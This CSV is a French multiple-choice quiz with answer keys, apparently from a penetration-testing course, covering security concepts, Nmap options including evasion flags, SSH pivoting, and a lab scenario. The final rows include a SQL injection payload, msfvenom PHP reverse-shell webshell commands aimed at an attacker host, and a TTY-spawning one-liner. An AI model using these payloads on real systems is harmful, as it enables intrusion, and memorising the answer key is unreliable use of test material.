Type,Title,Choice1,Choice2,Choice3,Choice4,Correct
MCQ,"Selon la définition du cours, qu'est-ce qui compose principalement un Système d'Information (S.I.) ?","L'infrastructure, les applications/services, les utilisateurs et les administrateurs","Uniquement les serveurs et les bases de données","Les logiciels de bureautique et le réseau internet","Les ordinateurs et les câbles réseaux",1
MCQ,"Quel est l'objectif premier de la sécurité des SI selon le support ?","Empêcher toute connexion internet","Identifier les risques sur les actifs et faire le nécessaire pour les protéger","Installer un antivirus sur chaque poste","Rendre le système invisible sur le réseau",2
MCQ,"Sur le Darkweb, quel est le prix moyen d'un numéro de carte bleue valide selon les données du cours ?","Entre 100 $ et 200 $","Entre 2 $ et 10 $","Gratuit","Plus de 500 $",2
MCQ,"Le logiciel malveillant 'Citadel' est cité comme exemple pour quelle capacité spécifique ?","Déni de service (DDoS)","Capture de numéros de carte bancaires","Chiffrement de données personnelles","Espionnage industriel",2
MCQ,"Dans une attaque par Rançongiciel (WannaCry), quelle faille de Windows est spécifiquement exploitée ?","BlueKeep","EternalBlue","PrintNightmare","Log4Shell",2
MCQ,"Quel critère DICT garantit que l'information n'est accessible qu'aux personnes autorisées ?","Disponibilité","Intégrité","Confidentialité","Traçabilité",3
MCQ,"Que signifie l'acronyme DMIA dans une évaluation de disponibilité ?","Débit Maximum d'Information Autorisé","Durée Maximale d'Interruption Admissible","Dispositif de Maintenance et d'Intervention Automatique","Données Moyennes d'Impact Annuel",2
MCQ,"Pour un site web 'vitrine' simple, quel est le niveau de confidentialité requis selon l'exercice du cours ?","Très fort","Modéré","Faible","Inexistant",3
MCQ,"Un pare-feu (Firewall) répond principalement à quels critères DICT ?","Disponibilité et Traçabilité","Disponibilité, Confidentialité et Traçabilité","Intégrité uniquement","Confidentialité uniquement",2
MCQ,"Selon la norme ISO 7498-2, une vulnérabilité est définie comme :","Une menace imminente","Une violation potentielle de la sécurité","Une erreur de code uniquement","Une perte financière",2
MCQ,"Une erreur commise par un programmeur lors de l'écriture du code est une vulnérabilité de quel type ?","Conception","Implémentation","Exploitation","Matérielle",2
MCQ,"Quel est le principe de la 'Défense en profondeur' ?","Utiliser un seul mot de passe complexe","Avoir plusieurs lignes de défenses indépendantes","Isoler le serveur dans une pièce fermée","Interdire l'accès aux stagiaires",2
MCQ,"Quelle norme ISO est considérée comme un 'Code de bonnes pratiques' non certifiant pour les entreprises ?","ISO 27001","ISO 27002","ISO 27005","ISO 9001",2
MCQ,"Dans le framework MITRE ATT&CK, que représente une 'Tactique' ?","La méthode concrète employée","Le 'Pourquoi' (l'objectif stratégique)","L'identifiant de la faille (CVE)","L'adresse IP de l'attaquant",2
MCQ,"Quel type d'audit de sécurité ne fournit 'aucune information' préalable sur la cible à l'auditeur ?","Boite blanche","Boite grise","Boite noire","Audit de conformité",3
MCQ,"Quel est le format correct d'un identifiant CVE ?","VULN-AAAA-NNNN","CVE-AAAA-NNNN","MITRE-AAAA-NN","YEAR-ID-NNNN",2
MCQ,"Dans l'OWASP Top 10 (2021), quel risque occupe la première place (A01) ?","Injection","Cryptographic Failures","Broken Access Control","Insecure Design",3
MCQ,"Quel outil est décrit comme le 'couteau suisse du TCP/IP' ?","Nmap","Nessus","Netcat (nc)","Wireshark",3
MCQ,"L'outil 'Shodan' est spécialisé dans quel type de recherche ?","Les codes sources sur GitHub","Le référencement d'objets connectés (IoT)","Les profils Facebook","Les archives de sites web",2
MCQ,"Quelle commande Nmap permet de réaliser une 'empreinte' (Finger-printing) du système d'exploitation ?","nmap -sP","nmap -O","nmap -sV","nmap -p-",2
MCQ,"Quel flag TCP est envoyé pour initier une connexion (Handshake) ?","ACK","FIN","SYN","RST",3
MCQ,"L'outil 'DirBuster' sert à quoi lors d'un test d'intrusion ?","Brute-forcer un mot de passe SSH","Reconstruire l'arborescence d'un site web","Scanner les ports ouverts","Intercepter des requêtes HTTP",2
MCQ,"Dans un rapport de pentest, que contient la 'fiche de vulnérabilité' ?","Le nom du pirate uniquement","Le titre, la criticité, la description, l'exploitation et la recommandation","Le budget de l'audit","La liste des employés de l'entreprise",2
MCQ,"Quelle est la recommandation principale du cours si vous êtes victime d'un rançongiciel ?","Payer immédiatement la rançon","Éteindre l'ordinateur","Ne pas payer la rançon et déconnecter la machine du réseau","Supprimer tous les fichiers",3
MCQ,"Dans quel type de test d'intrusion l'auditeur dispose-t-il d'informations détaillées comme le code source et le schéma de la base de données ?","Boite noire (Black box)","Boite grise (Grey box)","Boite blanche (White box)","Boite rouge (Red box)",3
MCQ,"Quel est le format correct d'un identifiant CVE (Common Vulnerabilities and Exposures) selon le cours ?","VULN-AAAA-NNNN","CVE-AAAA-NNNN","MITRE-AAAA-NNNN","FAIL-AAAA-NNNN",2
MCQ,"Parmi les outils suivants, lequel appartient à la phase de « recherche active » d'informations ?","DNSdumpster","WayBackMachine","Traceroute","Whois",3
MCQ,"À quoi sert principalement le moteur de recherche Shodan présenté dans le cours ?","Référencer les objets connectés (caméras IP, serveurs, etc.)","Trouver des sous-domaines cachés","Afficher d'anciennes versions de sites web","Énumérer les utilisateurs d'un système",1
MCQ,"Quel protocole l'outil Netdiscover utilise-t-il pour effectuer le mapping réseau et la découverte des hôtes ?","TCP","UDP","ICMP","ARP",4
MCQ,"Dans Nmap, que permet de faire l'option '-sS' ?","Scanner les ports UDP","Effectuer un scan furtif en envoyant un SYN sans établir complètement la connexion","Identifier le système d'exploitation cible","Récupérer la version des services (-sV)",2
MCQ,"Lors d'une communication TCP, quel flag est envoyé en premier pour initier la connexion (le handshake) ?","ACK","PSH","SYN","RST",3
MCQ,"Quelle est l'utilité principale de l'outil DirBuster développé par l'OWASP ?","Intercepter des requêtes HTTP","Scanner les vulnérabilités de bases de données","Reconstruire l'arborescence complète d'un site Web","Effectuer des attaques de force brute sur le protocole SSH",3
MCQ,"Quel outil, écrit en Python par Sébastien Macke, est décrit comme capable de bruteforcer de nombreux services (SSH, SMTP, MySQL, VNC, zip) ?","Hydra","Patator","Netcat","Nikto",2
MCQ,"Lequel de ces outils est qualifié de « couteau suisse du TCP/IP » grâce à sa polyvalence pour ouvrir des connexions réseau ?","Nmap","Netcat (nc)","BurpSuite","OpenVAS",2
MCQ,"Dans le rapport de pentest, quels éléments doivent figurer obligatoirement dans une « Fiche de vulnérabilité » ?","Le rappel du périmètre et le résumé des risques métier","Uniquement le titre et le nom de l'auditeur","Le titre, les indices de criticité, la description, l'exploitation et les recommandations","Le code source complet de l'application",3
MCQ,"Selon la définition du cours, qu'est-ce que le pivoting (ou déplacement latéral) ?","L'élévation de privilèges sur un système d'exploitation cible","L'utilisation d'une machine compromise comme point de rebond pour atteindre des segments inaccessibles","La création d'un tunnel chiffré pour masquer l'adresse IP de l'attaquant sur internet","Une technique d'attaque par déni de service distribué",2
MCQ,"Parmi les choix suivants, lequel n'est PAS mentionné comme un objectif du pivot dans le cours ?","Contourner les restrictions et filtrages réseau","Amplifier l'impact d'une compromission (Étendre la portée)","Détruire les journaux d'événements (logs) de la machine compromise","Atteindre les ressources sensibles (Systèmes critiques)",3
MCQ,"En analysant le schéma réseau du TP, quelle machine sert de pivot entre la VM Kali (Attaquant) et la VM Library ?","L'hyperviseur local","Le routeur de la VMWARE","La VM DOJO (connectée aux deux réseaux 192.168.10.0/24 et 192.168.20.0/24)","La VM Library elle-même",3
MCQ,"Quelle est la syntaxe exacte donnée dans le cours pour mettre en place un 'SSH local port forwarding' ?","$ssh userssh@ssh_server -D [bind_address:]local_port:destination_host","$ssh userssh@ssh_server -L [bind_address:]local_port:destination_host:destination_hostport","$ssh userssh@ssh_server -R local_port:destination_host:destination_hostport","$ssh userssh@ssh_server -P [bind_address:]local_port",2
MCQ,"À quoi sert l'option '-N' dans les commandes de création de tunnel SSH (Local ou Dynamic) présentées dans le cours ?","À se connecter sans demander de mot de passe (No password)","À chiffrer la connexion avec un algorithme non standard","À forcer l'utilisation du protocole IPv4","À ne pas exécuter de commande après l'authentification (ne pas lancer de shell)",4
MCQ,"Quel est l'un des inconvénients majeurs du 'SSH local port forwarding' qui est résolu par le 'dynamic port forwarding' ?","Il nécessite que le serveur SSH soit activé","Il nécessite de connaître un login et mot de passe","Il ne permet d'ouvrir les accès que 'port par port'","Il nécessite un compte à privilèges (root)",3
MCQ,"Lors d'un 'SSH dynamic port forwarding', quel type de serveur le client SSH local simule-t-il sur la machine de l'attaquant ?","Un proxy SOCKS (SOCKS4/5)","Un proxy HTTP/HTTPS","Un serveur DNS menteur","Un routeur NAT",1
MCQ,"Quel est un avantage COMMUN au Local et au Dynamic Port Forwarding selon les listes d'avantages du cours ?","L'ouverture de port et de cible est totalement dynamique","Aucun besoin d'avoir un compte à privilège sur le pivot","La connexion se fait sans avoir besoin du mot de passe de l'utilisateur","L'installation d'un logiciel tiers sur le pivot est requise",2
MCQ,"Dans l'exemple de commande curl fourni pour utiliser le tunnel dynamique ($curl --head 10.42.42.2 --proxy socks5://127.0.0.1:6666), que représente '127.0.0.1:6666' ?","L'adresse et le port du serveur web cible","L'adresse et le port du proxy SOCKS local créé par le tunnel SSH sur la machine de l'attaquant","L'adresse IP de la machine compromise (le pivot)","Le port d'écoute du serveur SSH distant",2
MCQ,"Que se passe-t-il indirectement lorsque l'auditeur requête 127.0.0.1 sur le port 5555 après avoir monté le tunnel 'Local port forwarding' de l'exemple du cours ?","Il se connecte au serveur SSH du Srv01","Il demande en fait la ressource située sur 172.16.2.30 au port 80","Il ouvre une connexion SOCKS vers tous les réseaux accessibles","Il accède aux fichiers locaux de la machine pivot",2
MCQ,"Quelle commande permet à Nmap de scanner 100 hôtes choisis au hasard de manière aléatoire ?","nmap -iL 100","nmap -iR 100","nmap -random 100","nmap -p 100",2
MCQ,"Comment exclure une adresse IP spécifique (ex: 192.168.1.1) lors d'un scan Nmap ?","nmap -remove 192.168.1.1","nmap -x 192.168.1.1","nmap -exclude 192.168.1.1","nmap --ignore 192.168.1.1",3
MCQ,"Quel est le type de scan de port par défaut (TCP SYN port scan) exécuté par Nmap lorsque vous avez les privilèges root ?","-sT","-sU","-sA","-sS",4
MCQ,"Quelle option est utilisée pour effectuer un scan de ports UDP ?","-sU","-sP","-sW","-sM",1
MCQ,"Que fait l'option '-sn' dans une commande Nmap ?","Elle effectue un scan furtif (Stealth)","Elle désactive le scan de ports pour ne faire que de la découverte d'hôtes (Host discovery only)","Elle scanne le réseau en utilisant des paquets fragmentés","Elle désactive la résolution DNS",2
MCQ,"Si vous souhaitez scanner directement les ports sans vérifier au préalable si l'hôte est en ligne (désactiver la découverte d'hôte), quel paramètre utilisez-vous ?","-PR","-sL","-Pn","-n",3
MCQ,"À quoi sert l'option '-PR' ?","À scanner uniquement les ports RDP","À réaliser une découverte ARP sur un réseau local","À faire un scan de ports 'Paranoid'","À relayer la connexion via un proxy",2
MCQ,"Comment indiquer à Nmap de ne JAMAIS effectuer de résolution DNS ?","-nD","-no-dns","-n","-Pn",3
MCQ,"Quelle option permet de faire un scan rapide limité aux 100 ports les plus courants ?","-F","-fast","-p 100","-top-ports 100",1
MCQ,"Pour scanner l'intégralité des ports (de 1 à 65535), quelle syntaxe est correcte ?","-p all","-p 1-65535","-p-","Les options 2 et 3 sont correctes",4
MCQ,"Quelle commande permet d'activer la détection de version des services en cours d'exécution sur les ports ouverts ?","-sV","-V","-O","-A",1
MCQ,"Que regroupe l'option '-A' lorsqu'elle est utilisée dans Nmap ?","Uniquement la détection du système d'exploitation","Le scan TCP ACK et le scan UDP","La détection d'OS, de version, le scan par scripts (NSE) et le traceroute","L'exportation des résultats dans tous les formats",3
MCQ,"Parmi les options de 'Timing and Performance', laquelle correspond au profil 'Paranoid' utilisé pour échapper aux systèmes de détection d'intrusion (IDS) ?","-T0","-T1","-T4","-T5",1
MCQ,"Si vous souhaitez accélérer drastiquement un scan sur un réseau très rapide et fiable, quel profil de timing est le plus agressif ('Insane') ?","-T1","-T3","-T4","-T5",4
MCQ,"Quelle option permet de s'assurer que Nmap n'envoie pas de paquets plus LENTEMENT qu'un certain nombre par seconde (ex: 100) ?","--max-rate 100","--min-rate 100","--host-timeout 100","--max-retries 100",2
MCQ,"Quelle est l'option équivalente à '--script default' pour lancer une analyse avec les scripts NSE par défaut (considérés comme sûrs et utiles) ?","-sC","-sS","-sV","-sA",1
MCQ,"Comment transmettre des arguments spécifiques à un script NSE lors d'un scan ?","--script-pass","--args","--script-args","--set-script",3
MCQ,"Afin d'échapper aux pare-feux, quelle option permet d'utiliser de minuscules paquets IP fragmentés ?","-f","-frag","-mtu","-D",1
MCQ,"À quoi sert l'option '-D' (suivie de plusieurs adresses IP) dans Nmap ?","À spécifier les serveurs DNS à utiliser","À envoyer des scans depuis des adresses IP usurpées (Decoys) pour masquer la véritable source","À définir le port de destination","À activer le mode débogage (Debug)",2
MCQ,"Quelle option permet d'utiliser un port source spécifique (ex: 53) pour tromper les règles de pare-feu ?","-S","-p","-g (ou --source-port)","-D",3
MCQ,"Quelle option permet d'ajouter des données aléatoires aux paquets envoyés, rendant les signatures d'attaque plus difficiles à détecter par un IDS ?","--randomize","--data-length","--append-output","--mtu",2
MCQ,"Comment demander à Nmap de générer une sortie dans un format 'grepable' (facile à filtrer avec grep) ?","-oG","-oX","-oN","-oA",1
MCQ,"Quelle option génère simultanément les trois principaux formats de sortie Nmap (Normal, XML, Grepable) ?","-oAll","-o3","-oA","-oN",3
MCQ,"Que permet de faire l'option '--packet-trace' ?","Générer un fichier PCAP pour Wireshark","Afficher en temps réel tous les paquets envoyés et reçus","Tracer la route réseau jusqu'à la cible","Calculer le temps de réponse (ping)",2
MCQ,"Quelle option utiliseriez-vous pour reprendre un scan Nmap qui a été interrompu précédemment ?","--resume","--restart","--continue","-resume-scan",1
MCQ,"Quelle option active le scan des adresses IPv6 ?","-ipv6","-6","-v6","--ip6",2
MCQ,"D'après le scan Nmap effectué sur la cible (192.168.1.43), quels sont les ports ouverts et les services associés ?","Port 22 (SSH) et Port 80 (HTTP)","Port 21 (FTP) et Port 80 (HTTP)","Port 21 (FTP) et Port 443 (HTTPS)","Port 80 (HTTP) et Port 3306 (MySQL)",2
MCQ,"Dans quel langage est écrit le scanner de vulnérabilités web Nikto, utilisé dans ce TP ?","Python","Java","Perl","Ruby",3
MCQ,"Quel est l'objectif principal de l'outil DirBuster (développé par l'OWASP) utilisé dans ce scénario ?","Intercepter et modifier les requêtes HTTP à la volée","Faire une attaque par force brute sur le service FTP","Scanner les vulnérabilités du noyau Linux","Reconstruire l'arborescence complète du site web via une recherche par dictionnaire",4
MCQ,"Lors de l'utilisation de Burp Suite, quel paramètre encodé dans l'URL a été identifié comme potentiellement vulnérable après un passage par le 'Décodeur' ?","country","phpsessid","lastviewed","username",3
MCQ,"Quelle commande d'injection SQL a été utilisée pour récupérer la version de la base de données via le paramètre vulnérable ?","{'lastviewed'==''Spain' UNION SELECT @@version'}","{'lastviewed'==''Spain' UNION SELECT database()'}","{'lastviewed'==''Spain' UNION SELECT table_name FROM information_schema'}","{'lastviewed'==''Spain' UNION SELECT password FROM access'}",1
MCQ,"Quels identifiants ont été trouvés grâce à l'injection SQL pour se connecter au service FTP (FileZilla) ?","root / password","globus / AroundTheWorld","admin / admin123","www-data / no-password",2
MCQ,"Quelle commande Msfvenom a été utilisée pour générer le webshell PHP malveillant (payload) ?","msfvenom -p php/meterpreter/bind_tcp RHOST=192.168.1.43 LPORT=6666 -o /root/webshell.php","msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.39 LPORT=4444 -o shell.exe","msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.39 LPORT=6666 -o /root/webshell.php","msfvenom -p php/reverse_php LHOST=192.168.1.0 LPORT=80 -o webshell.php",3
MCQ,"Une fois le fichier 'webshell.php' déposé via FTP, comment la connexion inversée (reverse shell) est-elle déclenchée par l'attaquant ?","En redémarrant le serveur FTP à distance","En appelant l'URL http://192.168.1.43/webshell.php depuis un navigateur web","En exécutant un script Python en local","En utilisant la commande 'nc -nlvp 6666' qui l'exécute automatiquement",2
MCQ,"Lors de la récupération du shell initial (via Netcat ou Metasploit), avec quel compte utilisateur l'attaquant est-il connecté sur le serveur ?","root","globus","www-data","ubuntu",3
MCQ,"Quelle commande Python est utilisée pour obtenir un shell interactif (TTY) afin de faciliter l'élévation de privilèges ?","python -c 'import pty; pty.spawn(""/bin/sh"")'","python -c 'import os; os.system(""/bin/bash"")'","python -c 'spawn(""/bin/tty"")'","python -c 'import socket; socket.connect()'",1
